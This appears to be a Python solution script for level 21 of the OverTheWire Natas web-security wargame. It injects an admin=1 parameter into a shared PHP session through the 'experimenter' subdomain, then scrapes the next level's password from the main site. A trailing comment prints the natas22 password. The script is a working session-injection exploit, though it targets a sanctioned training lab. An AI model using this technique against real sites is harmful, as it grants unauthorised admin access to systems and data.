from bs4 import BeautifulSoup
import requests
import re
def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())


lvl = '21'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)


url = 'http://natas21-experimenter.natas.labs.overthewire.org'

my_cookies = {"PHPSESSID":'iingj5ruhsj7k4b80kh7s35m30'}
my_params = {"submit":"true","admin":"1","debug":"true"}

res, soup = make()


url = 'http://natas21.natas.labs.overthewire.org'

res, soup = make()


pw = re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)

writeResponse()



'''
easy as pie

Username: natas22
Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
'''
